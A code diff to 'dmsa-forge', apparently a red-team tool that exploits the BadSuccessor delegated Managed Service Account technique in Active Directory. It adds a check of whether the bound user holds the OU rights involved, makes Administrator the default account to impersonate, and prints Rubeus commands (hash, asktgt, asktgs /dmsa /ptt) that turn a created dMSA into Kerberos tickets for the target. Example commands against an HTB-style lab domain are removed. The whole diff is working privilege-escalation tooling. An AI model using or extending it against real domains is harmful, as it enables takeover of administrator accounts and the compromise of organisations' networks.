@@ -26,6 +26,7 @@
 
 
 import argparse
+import ipaddress
 import json
 import logging
 import os
@@ -52,6 +53,8 @@ DEFAULT_UPDATE_SOURCE = 'git+https://github.com/RedteamNotes/dmsa-forge.git'
 DEFAULT_UPDATE_VERSION_URL = 'https://api.github.com/repos/RedteamNotes/dmsa-forge/releases/latest'
 DEFAULT_SUGGESTED_DMSA_NAME = 'redpen'
 DEFAULT_SUGGESTED_TARGET_ACCOUNT = 'Administrator'
+BADSUCCESSOR_RIGHTS_LABEL = 'BadSuccessor-relevant OU rights'
+BADSUCCESSOR_RIGHTS_MEANING = 'principals that can create dMSA objects or control the listed OUs'
 NEXT_STEP_PREFIX_ENV = 'DMSA_FORGE_NEXT_STEP_PREFIX'
 LDAP_BASE = 'BASE'
 LDAP_LEVEL = 'LEVEL'
@@ -65,6 +68,7 @@ DN_ATTR_RE = re.compile(r'^[A-Za-z][A-Za-z0-9-]*$')
 DN_OID_ATTR_RE = re.compile(r'^\d+(?:\.\d+)+$')
 VERSION_REF_RE = re.compile(r'^v?\d+(?:\.\d+)+(?:[-._+A-Za-z0-9]*)?$')
 IPV4_RE = re.compile(r'^\d{1,3}(?:\.\d{1,3}){3}$')
+IPV4_LIMITED_BROADCAST = '255.255.255.255'
 DEFAULT_VERIFY_ATTEMPTS = 3
 DEFAULT_VERIFY_DELAY = 2
 PROFILE_CHOICES = ('safe', 'report', 'ci')
@@ -150,7 +154,7 @@ class _LDAPAttribute:
     @staticmethod
     def _convert_value(name, value):
         lname = name.lower()
-        if lname == 'objectsid':
+        if lname in ('objectsid', 'tokengroups'):
             try:
                 return ldaptypes.LDAP_SID(data=value).formatCanonical()
             except Exception:
@@ -724,10 +728,23 @@ class DMSAForge:
         if not self._target_ip:
             resolved_dc_ip = resolve_ipv4_address(target_host)
             if resolved_dc_ip:
-                self._target_ip = resolved_dc_ip
-                self._options.resolved_dc_ip = resolved_dc_ip
-                dc_ip = resolved_dc_ip
-                self._record_inference('dc_ip', 'selected', resolved_dc_ip)
+                rejection_reason = auto_dc_ip_rejection_reason(resolved_dc_ip)
+                if rejection_reason:
+                    self._record_inference(
+                        'dc_ip',
+                        'rejected',
+                        'DNS resolved %s to %s (%s); pass --dc-ip with the real DC IPv4 if Kerberos /dc guidance is needed' % (
+                            target_host,
+                            resolved_dc_ip,
+                            rejection_reason,
+                        ),
+                        level=logging.WARNING,
+                    )
+                else:
+                    self._target_ip = resolved_dc_ip
+                    self._options.resolved_dc_ip = resolved_dc_ip
+                    dc_ip = resolved_dc_ip
+                    self._record_inference('dc_ip', 'selected', resolved_dc_ip)
 
         self._update_report_connection(target_host, dc_ip)
         self._reconcile_root_dse_base_dn(ldap_connection, target_host, dc_ip)
@@ -1007,6 +1024,16 @@ class DMSAForge:
                 "0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
             }
 
+            def record_allowed_sid(sid, ou_dn):
+                identity = self.resolve_sid_to_name(ldap_connection, sid) if self._search_resolve_names else sid
+                if sid not in allowed_identities:
+                    allowed_identities[sid] = {
+                        'identity': identity,
+                        'ous': [],
+                    }
+                if ou_dn not in allowed_identities[sid]['ous']:
+                    allowed_identities[sid]['ous'].append(ou_dn)
+
             for entry in ou_entries:
                 try:
                     ou_dn = str(entry.entry_dn)
@@ -1043,20 +1070,12 @@ class DMSAForge:
                             if self.is_excluded_sid(sid, domain_sid):
                                 continue
 
-                            identity = self.resolve_sid_to_name(ldap_connection, sid) if self._search_resolve_names else sid
-                            if identity not in allowed_identities:
-                                allowed_identities[identity] = []
-                            if ou_dn not in allowed_identities[identity]:
-                                allowed_identities[identity].append(ou_dn)
+                            record_allowed_sid(sid, ou_dn)
 
                     try:
                         owner_sid = sd['OwnerSid'].formatCanonical()
                         if not self.is_excluded_sid(owner_sid, domain_sid):
-                            identity = self.resolve_sid_to_name(ldap_connection, owner_sid) if self._search_resolve_names else owner_sid
-                            if identity not in allowed_identities:
-                                allowed_identities[identity] = []
-                            if ou_dn not in allowed_identities[identity]:
-                                allowed_identities[identity].append(ou_dn)
+                            record_allowed_sid(owner_sid, ou_dn)
                     except Exception as e:
                         logging.debug('Could not inspect owner SID for %s: %s' % (self._display_dn(ou_dn), e))
 
@@ -1064,21 +1083,58 @@ class DMSAForge:
                     logging.debug('Could not inspect OU security descriptor for %s: %s' % (self._display_dn(getattr(entry, 'entry_dn', '(unknown)')), e))
                     continue
 
+            current_user = {
+                'status': 'not_checked',
+                'reason': 'no matching OU rights were found',
+                'object_sid': None,
+                'effective_sids': [],
+                'token_groups_read': False,
+            }
             if allowed_identities:
-                logging.info('Found %d identities with BadSuccessor privileges:' % len(allowed_identities))
-                logging.info("")
-                logging.info("%-50s %s" % ("Identity", "Vulnerable OUs"))
-                logging.info("%-50s %s" % ("-" * 50, "-" * 30))
+                try:
+                    current_user = self.lookup_authenticated_effective_sids(ldap_connection)
+                except Exception as e:
+                    current_user = {
+                        'status': 'unavailable',
+                        'reason': str(e),
+                        'object_sid': None,
+                        'effective_sids': [],
+                        'token_groups_read': False,
+                    }
 
-                for identity, ous in allowed_identities.items():
-                    ou_list = "{%s}" % ", ".join([self._display_dn(ou) for ou in ous])
-                    logging.info("%-50s %s" % (identity[:50], ou_list))
-            else:
-                logging.info('No identities found with BadSuccessor privileges')
+                logging.info('Found %d identities with %s (%s):' % (
+                    len(allowed_identities),
+                    BADSUCCESSOR_RIGHTS_LABEL,
+                    BADSUCCESSOR_RIGHTS_MEANING,
+                ))
+                if current_user.get('status') == 'ok':
+                    matched_count = len([
+                        sid for sid in allowed_identities
+                        if self._bound_user_match_status(sid, current_user) == 'yes'
+                    ])
+                    if matched_count:
+                        logging.info('Bound user effective SID check: matched %d listed identity.' % matched_count)
+                    elif current_user.get('token_groups_read'):
+                        logging.info('Bound user effective SID check: no match.')
+                    else:
+                        logging.info('Bound user effective SID check: unknown for group grants; tokenGroups was not returned.')
+                else:
+                    logging.info('Bound user effective SID check: unknown. %s' % current_user.get('reason', ''))
                 logging.info("")
-                logging.info("%-50s %s" % ("Identity", "Vulnerable OUs"))
-                logging.info("%-50s %s" % ("-" * 50, "-" * 30))
-                logging.info("%-50s %s" % ("(none)", "(none)"))
+                logging.info("%-50s %-18s %s" % ("Identity", "Bound user", "OUs with relevant rights"))
+                logging.info("%-50s %-18s %s" % ("-" * 50, "-" * 18, "-" * 30))
+
+                for sid, item in allowed_identities.items():
+                    identity = item['identity']
+                    ous = item['ous']
+                    ou_list = "{%s}" % ", ".join([self._display_dn(ou) for ou in ous])
+                    logging.info("%-50s %-18s %s" % (identity[:50], self._bound_user_match_status(sid, current_user), ou_list))
+            else:
+                logging.info('No identities found with %s' % BADSUCCESSOR_RIGHTS_LABEL)
+                logging.info("")
+                logging.info("%-50s %-18s %s" % ("Identity", "Bound user", "OUs with relevant rights"))
+                logging.info("%-50s %-18s %s" % ("-" * 50, "-" * 18, "-" * 30))
+                logging.info("%-50s %-18s %s" % ("(none)", "(none)", "(none)"))
             self._set_report_result(
                 mode='security_descriptor_analysis',
                 windows_server_2025_dc_found=prereq_flag,
@@ -1086,22 +1142,31 @@ class DMSAForge:
                 search_base=self._display_dn(search_base),
                 ou_count=len(ou_entries),
                 identity_count=len(allowed_identities),
+                rights_label=BADSUCCESSOR_RIGHTS_LABEL,
+                rights_meaning=BADSUCCESSOR_RIGHTS_MEANING,
+                bound_user=current_user,
+                bound_user_match_count=len([
+                    sid for sid in allowed_identities
+                    if self._bound_user_match_status(sid, current_user) == 'yes'
+                ]),
                 identities=[
                     {
-                        'identity': identity,
-                        'ous': [self._display_dn(ou) for ou in ous],
+                        'sid': sid,
+                        'identity': item['identity'],
+                        'applies_to_bound_user': self._bound_user_match_status(sid, current_user),
+                        'ous': [self._display_dn(ou) for ou in item['ous']],
                     }
-                    for identity, ous in allowed_identities.items()
+                    for sid, item in allowed_identities.items()
                 ],
                 names_resolved=self._search_resolve_names,
             )
             self.report.setdefault('result', {})['_next_step_candidates'] = [
                 {
-                    'identity': identity,
+                    'identity': sid,
                     'target_ou': ou,
                 }
-                for identity, ous in allowed_identities.items()
-                for ou in ous
+                for sid, item in allowed_identities.items()
+                for ou in item['ous']
             ]
             return True
 
@@ -1174,6 +1239,142 @@ class DMSAForge:
         except Exception as e:
             logging.debug('Error resolving SID %s: %s' % (self._display_sid(sid), str(e)))
             return sid
+
+    def _sid_from_value(self, value):
+        if value in (None, ''):
+            return None
+        if isinstance(value, str):
+            value = value.strip()
+            return value if validate_sid_syntax(value) else None
+        if isinstance(value, (bytes, bytearray)):
+            try:
+                return ldaptypes.LDAP_SID(data=bytes(value)).formatCanonical()
+            except Exception:
+                return self.convert_sid_to_string(bytes(value))
+        return None
+
+    def _entry_sid_values(self, entry, attr_name):
+        if attr_name not in entry:
+            return []
+        attr = entry[attr_name]
+        values = []
+        for value in list(getattr(attr, 'values', []) or []) + list(getattr(attr, 'raw_values', []) or []):
+            sid = self._sid_from_value(value)
+            if sid and sid not in values:
+                values.append(sid)
+        return values
+
+    def _authenticated_account_names(self):
+        username = str(self._username or '').strip()
+        if not username:
+            return []
+        names = [username]
+        if '@' not in username and self._domain:
+            names.append('%s@%s' % (username, self._domain))
+        if '@' not in username and not username.endswith('$'):
+            names.append('%s$' % username)
+
+        deduped = []
+        seen = set()
+        for name in names:
+            lowered = name.lower()
+            if lowered in seen:
+                continue
+            seen.add(lowered)
+            deduped.append(name)
+        return deduped
+
+    def lookup_authenticated_effective_sids(self, ldap_connection):
+        names = self._authenticated_account_names()
+        if not names:
+            return {
+                'status': 'unavailable',
+                'reason': 'authenticated username is not available',
+                'object_sid': None,
+                'effective_sids': [],
+                'token_groups_read': False,
+            }
+
+        filter_terms = []
+        for name in names:
+            escaped = self._escape_filter_value(name)
+            filter_terms.extend([
+                '(sAMAccountName=%s)' % escaped,
+                '(userPrincipalName=%s)' % escaped,
+                '(cn=%s)' % escaped,
+                '(name=%s)' % escaped,
+            ])
+        search_filter = '(&(|(objectClass=user)(objectClass=computer))(objectSid=*)(|%s))' % ''.join(filter_terms)
+
+        last_result = None
+        for include_token_groups in (True, False):
+            attributes = ['objectSid', 'sAMAccountName', 'distinguishedName', 'cn', 'name', 'userPrincipalName', 'objectClass']
+            if include_token_groups:
+                attributes.append('tokenGroups')
+
+            success = ldap_connection.search(
+                search_base=self._base_dn,
+                search_filter=search_filter,
+                search_scope=LDAP_SUBTREE,
+                attributes=attributes,
+            )
+            last_result = getattr(ldap_connection, 'result', None)
+            if not success:
+                continue
+            if not ldap_connection.entries:
+                return {
+                    'status': 'unavailable',
+                    'reason': 'authenticated account was not found',
+                    'object_sid': None,
+                    'effective_sids': [],
+                    'token_groups_read': False,
+                }
+
+            entry, reason = self._select_account_entry(ldap_connection.entries, names)
+            if entry is None:
+                return {
+                    'status': 'unavailable',
+                    'reason': reason or 'authenticated account lookup was ambiguous',
+                    'object_sid': None,
+                    'effective_sids': [],
+                    'token_groups_read': False,
+                }
+
+            object_sids = self._entry_sid_values(entry, 'objectSid')
+            token_group_sids = self._entry_sid_values(entry, 'tokenGroups')
+            effective_sids = []
+            for sid in object_sids + token_group_sids:
+                if sid not in effective_sids:
+                    effective_sids.append(sid)
+
+            return {
+                'status': 'ok',
+                'reason': '',
+                'dn': self._display_dn(entry.entry_dn),
+                'sam_account_name': self._entry_value(entry, 'sAMAccountName') or self._username,
+                'object_sid': object_sids[0] if object_sids else None,
+                'effective_sids': effective_sids,
+                'effective_sid_count': len(effective_sids),
+                'token_groups_read': bool(token_group_sids),
+            }
+
+        return {
+            'status': 'unavailable',
+            'reason': 'authenticated account SID lookup failed: %s' % last_result,
+            'object_sid': None,
+            'effective_sids': [],
+            'token_groups_read': False,
+        }
+
+    def _bound_user_match_status(self, sid, current_user):
+        if not sid or not current_user or current_user.get('status') != 'ok':
+            return 'unknown'
+        effective_sids = set(current_user.get('effective_sids') or [])
+        if sid in effective_sids:
+            return 'yes'
+        if current_user.get('token_groups_read'):
+            return 'no'
+        return 'unknown'
 
 
     def generate_dmsa_name(self):
@@ -2114,30 +2315,32 @@ ACTION_SUMMARY = {
     'verify': 'Read and validate an existing dMSA object without LDAP writes.',
     'delete': 'Delete a dMSA object, with explicit --yes confirmation required.',
 }
+ACTION_USAGE = {
+    'search': '%(prog)s [domain/]username[:password] [options]',
+    'add': '%(prog)s [domain/]username[:password] --target-ou OU_DN [options]',
+    'verify': '%(prog)s [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME [options]',
+    'delete': '%(prog)s [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME --yes [options]',
+}
 ACTION_SHORTCUT_HELP = '''action shortcuts:
   dmsa-forge search [domain/]username[:password] [options]
-  dmsa-forge add [domain/]username[:password] --target-ou OU_DN --target-account ACCOUNT_OR_DN [options]
+  dmsa-forge add [domain/]username[:password] --target-ou OU_DN [options]
   dmsa-forge verify [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME [options]
   dmsa-forge delete [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME [options]
-  dmsa-forge plan add [domain/]username[:password] --target-account ACCOUNT_OR_DN [options]
-
-help shortcuts:
-  dmsa-forge actions
-  dmsa-forge examples
-  dmsa-forge help [action]
-  dmsa-forge add -h
 
 local setup:
+  dmsa-forge plan add [domain/]username[:password] --target-ou OU_DN [options]
   dmsa-forge update
+
+Use "dmsa-forge ACTION -h" for action-specific options.
 '''
 
 ACTION_REQUIREMENTS = {
-    'add': (('target_ou', '--target-ou'), ('target_account', '--target-account')),
+    'add': (('target_ou', '--target-ou'),),
     'delete': (('dmsa_name', '--dmsa-name'), ('target_ou', '--target-ou')),
     'verify': (('dmsa_name', '--dmsa-name'), ('target_ou', '--target-ou')),
 }
 DESTRUCTIVE_ACTIONS = ('delete',)
-REMOVED_COMMANDS = ('init', 'config', 'guidance', 'modify', 'completion')
+REMOVED_COMMANDS = ('init', 'config', 'guidance', 'modify', 'completion', 'actions', 'examples', 'help')
 UTILITY_COMMANDS = ('plan', 'update')
 SUBCOMMAND_CHOICES = ACTION_CHOICES + UTILITY_COMMANDS
 
@@ -2232,37 +2435,6 @@ OPTION_ALIASES = {
     'verify_delay': ('--verify-delay',),
 }
 
-GLOBAL_HELP_HINT = '''Use:
-  dmsa-forge actions          show action summaries
-  dmsa-forge examples         show copy-ready command templates
-  dmsa-forge help add         show action-specific help
-  dmsa-forge plan add ...     dry-run shorthand for an action
-  dmsa-forge update           update the current Python environment
-'''
-
-EXAMPLES_TEXT = '''Examples:
-  Preview an add without LDAP:
-    dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dry-run --target-ou 'OU=Staff,DC=eighteen,DC=htb' --target-account 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'
-
-  Add with signed LDAP on 389:
-    dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>' --target-account 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'
-
-  Verify:
-    dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen
-
-  Delete:
-    dmsa-forge delete eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --yes
-
-  Lightweight OU search:
-    dmsa-forge search eighteen.htb/adam.scott:'PASSWORD' --minimal
-
-  Security descriptor analysis:
-    dmsa-forge search eighteen.htb/adam.scott:'PASSWORD' --include-security-descriptor --resolve-names
-
-  Ultra-quiet JSON report to file:
-    dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dry-run --target-ou 'OU=Staff,DC=eighteen,DC=htb' --target-account 'CN=Administrator,CN=Users,DC=eighteen,DC=htb' --output-only --output /tmp/dmsa-forge-plan.json
-'''
-
 ACTION_HELP = {
     'search': '''search - discover candidate OUs
 
@@ -2273,34 +2445,26 @@ Default behavior:
   Requests OU security descriptors and analyzes BadSuccessor-relevant rights.
   Use --summary for a lightweight OU-only listing.
 
-Useful options:
-  --target-ou OU_DN    restrict OU search to this base
-  --summary             lightweight mode; do not request security descriptors
-  --include-security-descriptor
-                        request and analyze OU nTSecurityDescriptor security descriptors; default unless --summary is used
-  --resolve-names       resolve matching SIDs; requires --include-security-descriptor
-  --skip-dc-prereq      skip the Windows Server 2025 DC prerequisite query
-  --minimal             summary mode, no name resolution, no Kerberos guidance
-  --scope-domain FQDN   override the account-derived domain guardrail
-
 Example:
   dmsa-forge search eighteen.htb/adam.scott:'PASSWORD' --include-security-descriptor --resolve-names
 ''',
     'add': '''add - create and verify a dMSA object
 
 Usage:
-  dmsa-forge add [domain/]username[:password] --target-ou OU_DN --target-account ACCOUNT_OR_DN [options]
+  dmsa-forge add [domain/]username[:password] --target-ou OU_DN [options]
 
 Required:
   --target-ou OU_DN
-  --target-account ACCOUNT_OR_DN
 
 Strongly recommended:
   --dry-run first
   --dmsa-name NAME for reproducible cleanup
 
+Default:
+  --target-account Administrator
+
 Example:
-  dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'
+  dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen
 ''',
     'verify': '''verify - read and validate an existing dMSA object
 
@@ -2313,7 +2477,6 @@ Required:
 
 Optional:
   --principals-allowed USER_OR_SID  validate expected membership SID
-  --kerberos-guidance               print external Kerberos guidance after successful verification
   --json                            emit a structured verification report
 
 Example:
@@ -2377,7 +2540,7 @@ def completion_eval_hint(shell=None):
 
 def print_completion_hint(shell=None):
     print('')
-    print('Use "dmsa-forge ACTION -h" for action-specific options. Completion for this shell session: %s' % completion_eval_hint(shell))
+    print('Use "dmsa-forge ACTION -h" for action-specific options.')
 
 
 def print_parser_help_with_hint(parser, shell=None, no_banner=False):
@@ -2386,39 +2549,6 @@ def print_parser_help_with_hint(parser, shell=None, no_banner=False):
     parser.print_help()
     print_completion_hint(shell)
     sys.stdout.flush()
-
-
-def print_actions():
-    print('Actions:')
-    for action in ACTION_CHOICES:
-        print('  %-8s %s' % (action, ACTION_SUMMARY[action]))
-    print('')
-    print('Utilities:')
-    print('  %-8s %s' % ('plan', 'Dry-run shorthand, for example: dmsa-forge plan add ...'))
-    print('  %-8s %s' % ('update', 'Update dmsa-forge in the current Python environment.'))
-    print('')
-    print('Use "dmsa-forge help ACTION" for action-specific help.')
-    print('Use "dmsa-forge ACTION --help-advanced" for advanced flags.')
-
-
-def print_examples():
-    print(EXAMPLES_TEXT.rstrip())
-
-
-def print_action_help(action=None):
-    if action is None:
-        print(GLOBAL_HELP_HINT.rstrip())
-        print('')
-        print_actions()
-        return 0
-
-    if action not in ACTION_HELP:
-        sys.stderr.write('Unknown help topic: %s\n' % action)
-        sys.stderr.write('Known actions: %s\n' % ', '.join(ACTION_CHOICES))
-        return 2
-
-    print(ACTION_HELP[action].rstrip())
-    return 0
 
 
 def removed_command_message(command):
@@ -2430,6 +2560,8 @@ def removed_command_message(command):
         return '"modify" was removed; use delete/add/verify. dMSA core attributes are created atomically during add.'
     if command == 'completion':
         return '"completion" was removed; use %s for current-session completion.' % completion_eval_hint()
+    if command in ('actions', 'examples', 'help'):
+        return '"%s" was removed; use "dmsa-forge -h" or "dmsa-forge ACTION -h".' % command
     return '"%s" is not available.' % command
 
 
@@ -2472,7 +2604,6 @@ Workflow and compatibility:
   --verify-delay SECONDS     delay between verification attempts
   --kdc-wait SECONDS         explicit post-LDAP delay before external Kerberos
   --allow-admin-fallback     compatibility flag; exact DN candidates are automatic
-  --kerberos-guidance        print external Kerberos guidance after verified add/verify
   --next-step-prefix COMMAND prefix generated next-step commands only
   --ts                      timestamp log lines
   --debug                   verbose local debug output
@@ -2536,6 +2667,7 @@ def mark_supplied_options(options, argv):
         'dc_ip',
         'dmsa_name',
         'dns_hostname',
+        'target_account',
     ):
         setattr(options, '%s_supplied' % attr, option_supplied(argv, OPTION_ALIASES[attr]))
 
@@ -2853,19 +2985,46 @@ def is_ipv4_address(value):
     return all(0 <= int(part) <= 255 for part in value.split('.'))
 
 
-def resolve_ipv4_address(host):
+def auto_dc_ip_rejection_reason(value):
+    value = str(value or '').strip()
+    if not is_ipv4_address(value):
+        return 'not an IPv4 address'
+    try:
+        address = ipaddress.ip_address(value)
+    except ValueError:
+        return 'not an IPv4 address'
+    if address.is_multicast:
+        return 'multicast/proxy-DNS placeholder'
+    if address.is_loopback:
+        return 'loopback'
+    if address.is_link_local:
+        return 'link-local'
+    if address.is_unspecified:
+        return 'unspecified'
+    if value == IPV4_LIMITED_BROADCAST:
+        return 'limited broadcast'
+    if address.is_reserved:
+        return 'reserved'
+    return ''
+
+
+def is_usable_auto_dc_ip(value):
+    return not auto_dc_ip_rejection_reason(value)
+
+
+def resolve_ipv4_address(host, usable_only=False):
     host = str(host or '').strip()
     if not host:
         return None
     if is_ipv4_address(host):
-        return host
+        return host if not usable_only or is_usable_auto_dc_ip(host) else None
     try:
         infos = socket.getaddrinfo(host, None, socket.AF_INET, socket.SOCK_STREAM)
     except OSError:
         return None
     for info in infos:
         address = info[4][0]
-        if is_ipv4_address(address):
+        if is_ipv4_address(address) and (not usable_only or is_usable_auto_dc_ip(address)):
             return address
     return None
 
@@ -2894,17 +3053,26 @@ def ticket_name_for_user(username):
 
 
 def kerberos_guidance_lines(domain, username, password, dmsa_name, dc_host=None, dc_ip=None):
-    dc_ipv4 = resolve_ipv4_address(dc_ip) or resolve_ipv4_address(dc_host) or '<DC_IPV4>'
+    dc_ipv4 = None
+    if dc_ip:
+        dc_ipv4 = str(dc_ip).strip() if is_ipv4_address(dc_ip) else resolve_ipv4_address(dc_ip, usable_only=True)
+    if not dc_ipv4:
+        dc_ipv4 = resolve_ipv4_address(dc_host, usable_only=True)
+    dc_ipv4 = dc_ipv4 or '<DC_IPV4>'
     domain = str(domain or '').strip() or '<DOMAIN>'
     username = str(username or '').strip() or '<USERNAME>'
     password = str(password or '').strip() or '<PASSWORD>'
     dmsa_name = normalized_dmsa_name(dmsa_name) or DEFAULT_SUGGESTED_DMSA_NAME
     realm = domain.upper()
     ticket_path = ticket_name_for_user(username)
+    dc_hint = 'Use /dc:%s as an IPv4 address to avoid IPv6 link-local resolution.' % dc_ipv4
+    if dc_ipv4 == '<DC_IPV4>':
+        dc_hint = 'Pass --dc-ip with the real DC IPv4 before using these Kerberos commands.'
     return [
         'Next Kerberos step must be verified outside this script.',
-        'Use /dc:%s as an IPv4 address to avoid IPv6 link-local resolution.' % dc_ipv4,
-        r'.\Rubeus.exe asktgt /user:%s /password:%s /domain:%s /dc:%s /outfile:%s /nowrap' % (username, password, domain, dc_ipv4, ticket_path),
+        dc_hint,
+        r'.\Rubeus.exe hash /user:%s /password:%s /domain:%s' % (username, password, domain),
+        r'.\Rubeus.exe asktgt /user:%s /aes256:<AES256_HASH_FROM_RUBEUS_HASH> /domain:%s /dc:%s /outfile:%s /nowrap' % (username, domain, dc_ipv4, ticket_path),
         r".\Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/%s /targetuser:'%s$' /ticket:%s /dc:%s /ptt /nowrap" % (realm, dmsa_name, ticket_path, dc_ipv4),
     ]
 
@@ -3204,6 +3372,9 @@ def planned_inference_events(options):
     dns_hostname = effective_dns_hostname(options)
     if dns_hostname and not getattr(options, 'dns_hostname_supplied', False):
         add('dns_hostname', 'inferred', 'from --dmsa-name and account/scope domain')
+
+    if options.action == 'add' and not getattr(options, 'target_account_supplied', False):
+        add('target_account', 'inferred', 'default %s' % DEFAULT_SUGGESTED_TARGET_ACCOUNT)
 
     if options.principals_allowed is None and options.action == 'add':
         add('principals_allowed', 'runtime_default', 'use the authenticated username')
@@ -3848,7 +4019,7 @@ def print_dry_run_plan(options, report=None):
     log_plan_field('Target OU:', report['inputs']['target_ou'], None, inferred_kinds)
     log_plan_field('dMSA Name:', report['inputs']['dmsa_name'], None, inferred_kinds)
     logging.info('%-24s %s' % ('Planned dMSA DN:', report['inputs']['planned_dmsa_dn']))
-    log_plan_field('Target Account:', report['inputs']['target_account'], None, inferred_kinds)
+    log_plan_field('Target Account:', report['inputs']['target_account'], 'target_account', inferred_kinds)
     log_plan_field('Principals Allowed:', report['inputs']['principals_allowed'], 'principals_allowed', inferred_kinds)
     log_plan_field('DNS Hostname:', report['inputs']['dns_hostname'], 'dns_hostname', inferred_kinds)
     logging.info('%-24s %s' % ('Kerberos:', 'yes' if options.k else 'no'))
@@ -3966,7 +4137,7 @@ def build_parser():
     workflow.add_argument('--action', '-action', choices=ACTION_CHOICES, default='search', help='Action to perform. Prefer task-named commands such as "dmsa-forge add ...".')
     workflow.add_argument('--dmsa-name', '-dmsa-name', dest='dmsa_name', action='store', metavar='NAME', help='dMSA name. Add auto-generates dMSA-[A-Z0-9]{8} if omitted; verify/delete require it.')
     workflow.add_argument('--target-ou', '-target-ou', dest='target_ou', action='store', metavar='OU_DN', help='Target OU DN, for example "OU=Staff,DC=domain,DC=local".')
-    workflow.add_argument('--target-account', '-target-account', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN for msDS-ManagedAccountPrecededByLink.')
+    workflow.add_argument('--target-account', '-target-account', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN for msDS-ManagedAccountPrecededByLink. Defaults to Administrator for add.')
     workflow.add_argument('--principals-allowed', '-principals-allowed', dest='principals_allowed', action='store', metavar='USER_OR_SID', help='User/computer/group name, DN, or SID allowed to retrieve the managed password. Defaults to current username.')
     workflow.add_argument('--dns-hostname', '-dns-hostname', dest='dns_hostname', action='store', metavar='HOSTNAME', help='DNS hostname for the dMSA. Defaults to dmsaname.domain.')
     workflow.add_argument('--profile', choices=PROFILE_CHOICES, help='Apply a local preset: safe=redacted dry-run, report=JSON report, ci=quiet JSON/no banner.')
@@ -3979,7 +4150,7 @@ def build_parser():
     safety.add_argument('--output-only', '--minimal-output', dest='output_only', action='store_true', help='Ultra-quiet mode. Implies --quiet and --no-banner. Emits JSON to stdout, or JSON to --output with no stdout.')
     safety.add_argument('--quiet', action='store_true', help='Lower terminal output to warning/error only.')
     safety.add_argument('--no-banner', action='store_true', help='Suppress startup banner and attribution text for script-friendly output.')
-    safety.add_argument('--minimal', action='store_true', help='Lightest workflow: no broad search analysis, name resolution, or Kerberos guidance.')
+    safety.add_argument('--minimal', action='store_true', help='Lightest workflow: no broad search analysis, name resolution, or extra Kerberos command output.')
     safety.add_argument('--lean', '--low-noise', dest='low_noise', action='store_true', help='Enable lean local defaults: --minimal, --quiet, --no-banner, and search-only --skip-dc-prereq.')
     redaction = safety.add_mutually_exclusive_group()
     redaction.add_argument('--redact', dest='redact', action='store_true', default=True, help='Redact sensitive local output. This is the default.')
@@ -4018,31 +4189,33 @@ def build_parser():
     return parser
 
 
-def add_common_local_options(parser, include_workflow=True, include_help_advanced=False):
+def add_common_local_options(parser, include_workflow=True, include_help_advanced=False, concise=False):
     local = parser.add_argument_group('local controls')
-    local.add_argument('--profile', choices=PROFILE_CHOICES, help='Apply a local preset: safe=redacted dry-run, report=JSON report, ci=quiet JSON/no banner.')
+    hidden = argparse.SUPPRESS
+    local.add_argument('--profile', choices=PROFILE_CHOICES, help=hidden if concise else 'Apply a local preset: safe=redacted dry-run, report=JSON report, ci=quiet JSON/no banner.')
     if include_workflow:
         local.add_argument('--dry-run', '--plan', dest='dry_run', action='store_true', help='Validate options and print planned LDAP operations without opening LDAP.')
-    local.add_argument('--json', action='store_true', help='Emit a structured JSON operation report to stdout.')
-    local.add_argument('--output', action='store', metavar='FILE', help='Write the operation report to FILE with mode 0600. With --output-only, FILE is JSON.')
-    local.add_argument('--output-only', '--minimal-output', dest='output_only', action='store_true', help='Emit only JSON to stdout, or JSON to --output with no stdout.')
-    local.add_argument('--quiet', action='store_true', help='Lower terminal output to warning/error only.')
+    local.add_argument('--json', action='store_true', help=hidden if concise else 'Emit a structured JSON operation report to stdout.')
+    local.add_argument('--output', action='store', metavar='FILE', help=hidden if concise else 'Write the operation report to FILE with mode 0600. With --output-only, FILE is JSON.')
+    local.add_argument('--output-only', '--minimal-output', dest='output_only', action='store_true', help=hidden if concise else 'Emit only JSON to stdout, or JSON to --output with no stdout.')
+    local.add_argument('--quiet', action='store_true', help=hidden if concise else 'Lower terminal output to warning/error only.')
     local.add_argument('--no-banner', action='store_true', help='Suppress startup banner and attribution text.')
     if include_workflow:
-        local.add_argument('--minimal', action='store_true', help='Lightest workflow: no broad search analysis, name resolution, or Kerberos guidance.')
-        local.add_argument('--lean', '--low-noise', dest='low_noise', action='store_true', help='Enable lean local defaults.')
+        local.add_argument('--minimal', action='store_true', help=hidden if concise else 'Lightest workflow: no broad search analysis, name resolution, or extra Kerberos command output.')
+        local.add_argument('--lean', '--low-noise', dest='low_noise', action='store_true', help=hidden if concise else 'Enable lean local defaults.')
     redaction = local.add_mutually_exclusive_group()
-    redaction.add_argument('--redact', dest='redact', action='store_true', default=True, help='Redact sensitive local output. This is the default.')
-    redaction.add_argument('--no-redact', dest='redact', action='store_false', help='Disable local output redaction. Requires --debug.')
+    redaction.add_argument('--redact', dest='redact', action='store_true', default=True, help=hidden if concise else 'Redact sensitive local output. This is the default.')
+    redaction.add_argument('--no-redact', dest='redact', action='store_false', help=hidden if concise else 'Disable local output redaction. Requires --debug.')
